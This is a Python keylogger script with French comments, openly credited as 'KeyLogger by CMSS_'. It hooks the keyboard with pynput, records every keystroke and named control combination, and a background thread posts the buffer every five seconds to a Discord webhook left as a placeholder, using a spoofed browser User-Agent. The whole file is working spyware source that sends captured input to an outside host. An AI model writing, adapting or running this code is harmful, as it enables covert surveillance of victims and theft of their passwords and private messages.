from pynput import keyboard
from threading import Thread
from requests import post
from time import sleep
from json import dumps


# entrer votre webhook discord entre guillemets

lien = "YOUR_WEBHOOK"

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}


keys = {}

cle = ""


def envoi_fichier():
    global cle
    while True:
        webhook = {"content" : cle, "username": "KeyLogger by CMSS_"}
        print(post(lien, data=dumps(webhook).encode('utf8'), headers=headers))
        cle = ""
        sleep(5)




for i in range(11):
    keys["<" + str(i + 96) + ">"] = str(i)


def on_press(key):
    global cle
    key = str(key)

    if key in keys:
        key = keys[key]

    if key[0] == "'" and key[2] == "'":
        key = key[1]
    
    if key == "Key.ctrl_l":
        key = "ctrl"

    if key == "Key.caps_lock":
        key = "maj_lock"
    
    if key == "Key.shift":
        key = "shift"

    if key == "Key.enter":
        key = "enter"

    if key == "Key.space":
        key = "space"

    if key == "Key.backspace":
        key = "delete"

    if key == str(r"'\x03'"):
        key = "ctrl_c"
    
    if key == str(r"'\x16'"):
        key = "ctrl_v"

    if key == str(r"'\x13'"):
        key = "ctrl_s"

    if key == str(r"'\x06'"):
        key = "ctrl_f"

    if key == str(r"'\x08'"):
        key = "ctrl_h"

    cle += f"{key}\n"


    
Thread(target=envoi_fichier).start()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
